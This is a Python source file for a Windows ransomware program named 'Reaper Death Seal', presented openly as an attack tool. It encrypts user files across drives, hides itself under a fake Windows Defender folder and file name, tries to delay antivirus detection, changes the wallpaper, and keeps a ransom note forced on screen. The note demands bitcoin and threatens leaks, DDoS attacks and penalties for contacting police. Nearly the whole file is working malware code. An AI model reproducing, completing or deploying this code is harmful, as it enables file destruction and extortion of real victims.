#I want to create the Reaper Death Seal Ransomware that will encrypt the files of the target system
print("This file has started running \n")

##Useful libraries that I would be working with -->
import webbrowser # to load webbrowser to go to specific website eg bitcoin
import ctypes # so we can intereact with windows dlls and change windows background etc
import urllib.request # used for downloading and saving background image
import requests # used to make get request to api.ipify.org to get target machine ip addr
import time # used to time.sleep interval for ransom note & check desktop to decrypt system/files
import datetime # to give time limit on ransom note
import subprocess # to create process for notepad and open ransom  note
import win32gui # used to get window text to see if ransom note is on top of all other windows
import win32api
import base64
import cv2 as cv
import imghdr
import os, sys, time
import smtplib
import stat
#import winshell
from Cryptodome.PublicKey import RSA
from Cryptodome.Cipher import AES, PKCS1_OAEP
from cryptography.fernet import Fernet # encrypt/decrypt files on target system
from Cryptodome.Random import get_random_bytes
from threading import Thread # used for ransom note and decryption key on dekstop
#from email.message import EmailMessage
#from multiprocessing import Process
import config
#from akatsuki_library import bind_shell as bs
#from akatsuki_library import networm as worm
import ip_info
#import docx
import traceback

#This gets the full path of whatever file that was specified
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    base_path = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(os.path.abspath(__file__))))
    return os.path.abspath(os.path.join(base_path, relative_path))

#Checking for the path extension
def cloudDrive(path_ext = None):
    if path_ext:
        pathExt = f"\\{path_ext}"
    else:
        try:
            cloud = os.getcwd().split('\\')[3]
        except:
            cloud = os.getcwd().split('\\')
        finally:
            cloud_ = ["Drive", "Cloud", "mega", "sync"]
            for id, i in enumerate(cloud_):
                if i in cloud: #This checks if the system files are backed up
                    #print("System is not encryptable because its files is backed up")
                    print(True)
                    #exit()
                    if type(cloud) == list:
                        pathExt = f""
                    else:
                        pathExt = f"\\{cloud}"
                    break
                else:
                    print(False)
                    pathExt = ""

            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
            print(f"Path: {os.getcwd()}")
            print(f"Cloud Path: {cloud}")
            print(f"Path Extension: {pathExt}")
            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    return pathExt

#This function would make the malware to hide in the specified path while it continues it's execution
path_ = os.getcwd().split('\\')[0]
file = os.path.basename(sys.argv[0])
to_path = f"{path_}\\WindowsDefender"
infectionMarker = f"{to_path}\\license_key.txt"
name = "windows_firewall.exe"
def Amenotejikara():
    file = os.path.basename(sys.argv[0]) 
    originalpath = sys.argv[0]
    os.chmod(file, 0o777)
    
    pwd = os.getcwd()

    try:
        if os.path.isdir(to_path) == True:
            print(True)
            #os.chdir(f"{path_}\\")
            os.system(f"move {file} {to_path}")
            os.chdir(to_path)
            os.system(f"rename {file} {name}")
            os.chdir(pwd)
            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
            print("File has been moved")
            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        else:
            print(False)
            os.chdir(f"{path_}\\")
            os.mkdir("WindowsDefender")
            os.chdir(pwd)
            os.system(f"move {file} {to_path}")
            os.chdir(f"{to_path}\\")
            os.system(f"rename {file} {name}")
            os.chdir(pwd)
            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
            print("File has been moved")
            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        nwd = os.getcwd()
    except:
        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        print("File was not moved")
        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        pass

#This function creates a marker file on the target machine
def markInfected():
    print('Marking the system with the ransomware infection marker')
    nwd = os.getcwd()

    if os.path.isdir(to_path) == True:
        print(True)
        pass
    else:
        print(False)
        os.chdir(f"{path_}\\")
        os.mkdir("WindowsDefender")
        os.chdir(nwd)
        pass

    with open(infectionMarker, "w") as marker:
        marker.write("""Your Windows Defender license key is MS271-YE1JU-MQ25X-6LA0B""")

#This function checks if a system is already infected or not
def isInfected():
    print("Checking to see if system has already been infected")
    stat_ = os.path.exists(infectionMarker)
    if stat_ == True:
        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        print("System has already been infected with this malware, exiting the program now")
        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        sys.exit()
    else:
        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        print("System hasn't been infected yet with this malware, moving on to infect and finally mark target system..")
        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        stat_ = False
    return stat_

#Looping through all drives in the target machine to find all the available accessible drives that can be encrypted
def selectedDrives():
    drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
    available = []
    for drive in drives:
        try:
            if len(os.listdir(drive)) == 0:
                #print(f"{drive} directory is empty")
                pass
            else:
                #print(f"{drive} has been added to the available drives")
                available.append(drive)
        except:
            #print(f"Error in accessing {drive}")
            pass
    
    #print(available)
    return available


#Declaring the class for the reaper death seal ransomware
class reaperDeathSeal:
    def __init__(self, attacker, target, amount, display = True, path_ext = None, emailAddress = None, walletAddress = None):
        self.fileExts = ["csv", 'txt', "pdf", "csv", "jpg", "r", 'doc', "png", "docx", "gif", "svg", "tif", "xlsx", 
                         "xls", "avi", "mp4", "mov", "ppt", "pptx", "odp", "key", "m4a", "mp3", "wav", "html", "ipj",
                         "xml", "eps", "psd", "ai", 'sh', "py", "c", "cpp", "css", "dart", "php", "perl", "db", "sln",
                         "sql"] # File extensions to seek out and Encrypt
        self.key = None # Key that will be used for Fernet object and encrypt/decrypt method
        self.crypter = None # Encrypter/Decrypter
        #_, self.publicKey = ss.key() # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
        self.drives = selectedDrives()
        print(f"Available Drives: {self.drives}")
        self.cDrive = f"C:\\Users"
        self.key_ = config.GetKey()
        self.emailAddress = emailAddress
        self.user, self.host, self.publicIP, self.privateIP = ip_info.main() #(Check if you have hit gov, military ip space LOL)
        self.attacker = attacker
        self.publicKey = self.key_.publicKey()
        self.display = display
        self.target = target
        self.btcAddress = walletAddress
        self.datetime = datetime.datetime.now().strftime("%H:%M:%S %p. %d %B, %Y")
        self.amount = amount
        self.pathExt = cloudDrive(path_ext)
        #print(self.cDrive)
        self.sysRoot = os.path.expanduser('~') # Use sysroot to create absolute path for files, etc. And for encrypting whole system
        #print(self.sysRoot)
        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
        self.localRoot = f'C:\\Users\\{self.user}\\files' # Debugging/ Testing OneDrive\\
        self.report = f"""{'~' * 30} RANSOMWARE ENCRYPTER REPORT {'~' * 30}

        ~~~ Mission Details ~~~
Attacker: {self.attacker}
Target: {self.target}
Amount: {self.amount}
Username: {self.user}
Hostname: {self.host}
Private IP: {self.privateIP}
Public IP: {self.publicIP}
Time Stamp: {self.datetime}


           ~~~ Mission Briefing ~~~      \n\n ~~~ Encrypted File Details ~~~
 ID |           Files           |  ERROR STATUS      \n{'~' * 100}\n"""
        self.count = 1

    # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
    def generateKey(self):
        self.key =  Fernet.generate_key() # Generates a url safe(base64 encoded) key
        self.crypter = Fernet(self.key) # Creates a Fernet object with encrypt/decrypt methods
    
    # Write the fernet(symmetric key) to text file
    def writeKey(self):
        return self.key
           
    # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt files with our PUBLIC ASYMMETRIC-
    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
    # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
    def encryptFernetKey(self):
        print(f"Encrypt Fernet Key Directory: {os.getcwd()}")
        fernetKey = self.writeKey()
        
        publicKey = RSA.import_key(self.publicKey) # This gets the Public RSA key
        publicCrypter =  PKCS1_OAEP.new(publicKey) # Public encrypter object
        encFernetKey = publicCrypter.encrypt(fernetKey) # Encrypted fernet key
        if self.display:
            with open(f'{self.sysRoot}{self.pathExt}\\Desktop\\{self.target}_EMAIL_ME.txt', 'wb') as fa:
                fa.write(encFernetKey)
        else:
            pass
        self.key = encFernetKey # Assign self.key to encrypted fernet key
        self.crypter = None # Remove fernet crypter object

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt file - file_path:str:absolute file path eg, C:/Folder/Folder/Folder/Filename.txt
    def cryptFile(self, filePath, encrypted = False):
        try:
            with open(filePath, 'rb') as f:
                data = f.read() # Read data from file
                if not encrypted:
                    #print(data) # Print file contents - [debugging]
                    _data = self.crypter.encrypt(data) # Encrypt data from file
                    print(f'> {filePath} encrypted') # Log file encrypted and print encrypted contents - [debugging]
                    error = "Success"
            with open(filePath, 'wb') as fp:
                fp.write(_data) # Write encrypted/decrypted data to file using same filename to overwrite original file
            return f'> {filePath} encrypted successfully'
        except Exception as e:
            error = e
            print(f'> {filePath} not encrypted due to [{e}]')
        finally:
            self.report += f" {self.count} |    {filePath}      |   {error}     \n"
            self.count += 1

    # [SYMMETRIC KEY] Fernet Encrypt/Decrypt files on system using the symmetric key that was generated on victim machine
    def cryptSystem(self, encrypted = False):
        global status
        status = []
        pwd = os.getcwd()
        for drive in self.drives: #When compiling the software, remember to loop through the drives for the system ---------------------------------------->
            try:
                os.chdir(drive)
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                print(f"Current Drive: {drive}")
                print(f"Current Working Directory: {os.getcwd()}")
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                try:
                    #drive_ = os.path.expanduser("~") #This gets the sys root for each available drive --------- Uncomment this when you are compiling the code -->
                    drive_ = f"{os.path.expanduser('~')}\\files" #This folder is for debugging the encryption functionality
                except:
                    drive_ = drive
                os.chdir(pwd)
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                print(f"New Current Drive: {drive_}")
                print(f"New Current Working Directory: {os.getcwd()}")
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                system = os.walk(drive_, topdown = True) 
                for root, dir, files in system:
                    for file in files:
                        filePath = os.path.join(root, file)
                        if not file.split('.')[-1] in self.fileExts:
                            continue
                        if not encrypted:
                            status_ = self.cryptFile(filePath)
                            status.append(status_)
                self.report += "\n"
                return True
            except Exception as e:
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                print(f'Encrypting System Function Error: [{e}]')
                print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                
                return False
                pass
    
    # This function opens browser to the https://bitcoin.org so they know what bitcoin is incase they don't
    #@staticmethod
    def whatIsBitcoin(self):
        if self.display:
            try:
                url = 'https://bitcoin.org'
                webbrowser.open(url) 
                stat_ = "Executed Successfully"
            except Exception as e:
                print(f"Website Error: [{e}]")
                stat_ = e
        else:
            stat_ = "Not enabled"
        self.report += f"Browser Status: {stat_}\n"

    #This function changes the desktop background
    def changeDesktopBackground(self):
        if self.display:
            try:
                imagePath = resource_path("files\\ransomware_background.jpg")
                #print(imagePath)
                image = cv.imread(imagePath)
                path = f'{self.sysRoot}{self.pathExt}\\Desktop\\background.jpg' # Go to specif url and download+save image using absolute path
                cv.imwrite(path, image)
                SPI_SETDESKWALLPAPER = 20
                ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0) # Access windows dlls for funcionality eg, changing dekstop wallpaper
                print('Changed Desktop background successfully!!')
                stat_ = "Executed Successfully" 
            except Exception as e:
                print(f"Desktop Change Background Error: [{e}]")
                stat_ = e
        else:
            stat_ = "Not enabled"
        self.report += f"Desktop Background Status: {stat_}\n"

    
    #This function handles the ransom note background
    def ransomNote(self):
        self.report += f"Target Encryption Timestamp: {self.datetime}\n"
        if self.display:
            with open(f'{self.sysRoot}{self.pathExt}\\Desktop\\RANSOM_NOTE.txt', 'w', encoding = "utf-8") as f:
                f.write(f'''
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ -([[ WE ARE THE AKATSUKI ]])- ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        

Hi {self.target}, your system has been infected by the Akatsuki's Shinigami Ransomware, we know you're overwhelmed right now but then
    we really don't mean you any harm and we are sincerely sorry for all the inconveniences we are currently causing.

Incase you haven't noticed, the harddisks of your computer and files within it have been encrypted with a top Military grade encryption algorithm.
There is no way to restore your data without a decryption software and key that we only possess, in short we are the only ones that can decrypt your files!. 
We have tested the decryption software and key and it works perfectly, you can trust us to decrypt your files without any damage to your files, we have a reputation to uphold.

To get the decryption key for your files you would have to pay a ransom of {self.amount}$ worth of bitcoin, 
    for every 24hrs delay the fine increases by 5% of whatever the current price is

Anyways you have got two options;
1. Delay, contemplate your options and try to play smart but then be rest assured you will loose alot more money than the fine, 
    loose your files and still pay for damages that could have been avoided 
    
                        OR

2. Comply with us and pay the fine, that way you get on with your business swiftly, get access back to your files and 
    save unneccessary funds on damages

        {self.target} YOUR TIME STARTED [{self.datetime}]!!, We really hope you make the right decision

To purchase your key and restore your data, please follow these three easy steps:
1. Make payment to the bitcoin wallet address --> {self.btcAddress}
2. Email the file called {self.target}_EMAIL_ME.txt at {self.sysRoot}{self.pathExt}\Desktop\{self.target}_EMAIL_ME.txt alongside with a picture of your bitcoin transaction receipt
    to {self.emailAddress}. We will check to see if payment has been paid.
3. Then you will receive both the decryption software and text file containing the decryption key that will unlock all your files. 
   IMPORTANT: To decrypt your files, place text file and decryption software on the desktop directory, run the decryption software and wait. Shortly after it will begin decrypting all your files.
                When its done decrypting your files, it would let you know, do not switch off your system until the software has finished decrypting your files.

WARNING!!:
> If you don't know what a bitcoin is, a browser has been opened on your system that describes what Bitcoin is all about
> Do NOT change file names, mess with the files or run any other decryption software as it will cost you more to unlock your files and there is a high chance 
    you will lose your files forever. We bare no responsiblity for any unfortunate events that will befall your files
> Do NOT contact the police as it would be a waste of your precious time, price WILL increase by 20% for your disobedience
> Failure to comply within one week would result in an extra 50% fine increase, leaking and deletion of your files accompanied with constant relays of DDOS attacks. Do not think we won't, WE WILL!!.


        読んでくれてありがとう、気をつけて
''')
        else:
            pass

    #This function displays the ransomnote on the system
    def showRansomNote(self):
        if self.display:
            try:
                os.remove(f'{self.sysRoot}{self.pathExt}\\Desktop\\background.jpg')
                global topWindow, status
                ransom = subprocess.Popen(['Notepad.exe', f'{self.sysRoot}{self.pathExt}\\Desktop\\RANSOM_NOTE.txt']) # Open the ransom note
                count = 0 # Debugging/Testing
                print("Checking if the ransom note is the main window thats been viewed before ending the program")
                while True:
                    time.sleep(0.1)
                    topWindow = win32gui.GetWindowText(win32gui.GetForegroundWindow())
                    if topWindow == 'RANSOM_NOTE - Notepad':
                        print('Ransom note is the top window - do nothing') # Debugging/Testing
                        pass
                    else:
                        print('Ransom note is not the top window - kill/create process again') # Debugging/Testing
                        time.sleep(0.1)
                        ransom.kill() # Kill ransom note so we can open it agian and make sure ransom note is in ForeGround (top of all windows)
                
                        time.sleep(0.1)
                        ransom = subprocess.Popen(['Notepad.exe', f'{self.sysRoot}{self.pathExt}\\Desktop\\RANSOM_NOTE.txt']) # Open the ransom note
                    stat_ = "Executed Successfully"
                    time.sleep(10) # sleeps for 10 seconds before re-executing
                    count += 1 
                    if count == 5:
                        print()
                        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                        print("System has been successfully encrypted with the Reaper Death Seal Ransomware Encryptor")
                        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
                        print()
                        success = True
                        break
            except Exception as e:
                print(f"An error occurred when displaying ransom note due to [{e}]")
                stat_ = e
        else:
            stat_ = "Not enabled"  
        self.report += f"Ransom Note Status: {stat_}\n"

        #This section would delete the neccessary files to be deleted
        file_path = [f'{self.sysRoot}{self.pathExt}\\Desktop\\background.jpg']
        self.report += f"\n\n     ~~~ Deletion Details ~~~  \n"
        for path in file_path:
            try:
                if os.path.exists(path) == True:
                    os.remove(path)
                    stat_ = "deleted"
                else:
                    stat_ = "not found"
                    pass
            except Exception as e:
                stat_ = f"error occured due to {e}"
            finally:
                name = os.path.basename(path)
                self.report += f"> {name} -- {stat_} \n"
        print(f"{'~' * 20} Finished written the report {'~' * 20} ")

        
                
#This function handles the ransomware functionalities
def Shinigami(attacker, target, amount, display = True, path_ext = None, emailAddress = None, walletAddress = None):
    try:
        _stat_ = isInfected() #Checking to see if the system is already infected with the ransomware

        print('Starting to encrypt the files of the target machine') #Debugging/Testing
    
        rw = reaperDeathSeal(attacker, target, amount, display, path_ext, emailAddress, walletAddress)
        rw.generateKey()
        rw.cryptSystem()
        rw.encryptFernetKey()
        rw.changeDesktopBackground()
        rw.whatIsBitcoin()
        rw.ransomNote()
        rw.showRansomNote()

        print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
        print()
        print('Finished encrypting the files of the target machine and marking the system now') # Debugging/Testing

        markInfected() #This marks the system

        print()
        stat_ = "Ransomware encryptor executed successfully on the target machine"
    except Exception as e:
        stat_ = f"An error occurred when executing ransomware encrypter due to [{e}]"
        traceback.print_exc()
    return stat_


#This function helps schedules when the shinigami encryptor will be executed
#def summon_shinigami():
#    while True:
#        now = datetime.datetime.now()
#        now = now.strftime("%H:%M:%S %p. %d %B, %Y")
#        date = r'15:26:30 PM. 06 March, 2022'

#        #print(now.strftime("%H:%M:%S %p. %d %b, %Y"))
#        if now == date:
#            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
#            print(f'{True}: {now}.. Its time to start encrypting files')
#            print("Shinigami no Jutsu")
#            print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
#            Shinigami()
#            break
        

#This function helps coordinate all the malware simultaenously
def attack(attacker, target, amount, display = True, path_ext = None, emailAddress = None, walletAddress = None):
    try:
        print("Delaying the attack for a few minutes")
        time.sleep(1) #Delaying the execution for a few minutes in attempt to evade windows defender

        Shinigami(attacker, target, amount, display, path_ext, emailAddress, walletAddress)

        #Threading all the various functions so that they all execute simultaenously
        #p1 = Thread(target = summon_shinigami) 
        #p1 = Thread(target = Shinigami) 
        #p1.start()
        #p2 = Thread(target = bs.Shintenshin, args = (target, ))
        #p2.start()
        #p3 = Thread(target = send_target_info)
        #p3.start()
        #p4 = Thread(target = worm.KageBunshin)
        #p4.start()

        #for p in [p1, p2, p3]: #This joins the various threads together
        #    p.join()
        stat_ = "Ransomware encryptor executed successfully on the target machine"
    except Exception as e:
        stat_ = f"An error occurred when executing ransomware encrypter due to [{e}]"
    return stat_
    


if __name__ == '__main__':
    #Commencing with the code
    print("REAPER DEATH SEAL RANSOMWARE ENCRYPTOR \n")

    #infection_checker()

    sec = 1 * 2
    print(f"Attack will start in {sec} seconds")
    print("~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
    print()
    time.sleep(sec) #This is so that the malware can try and evade virus detection 
    
    #sys.exit()

    #This commences the attack on the target's machine after checking if the target system has been infected or not
    try:
        attacker, target, amount, display, path_ext, emailAddress, walletAddress = "Uchiha Minato", "Mountain_Hotel", "25,000", True, "OneDrive", "email-address", "wallet-address"
        attack(attacker, target, amount, display, path_ext, emailAddress, walletAddress)
    except Exception as e:
        print(f"Attack couldn't go through successfully due to [{e}]")

    print("\nExecuted successfully!!")

    
    
        
        


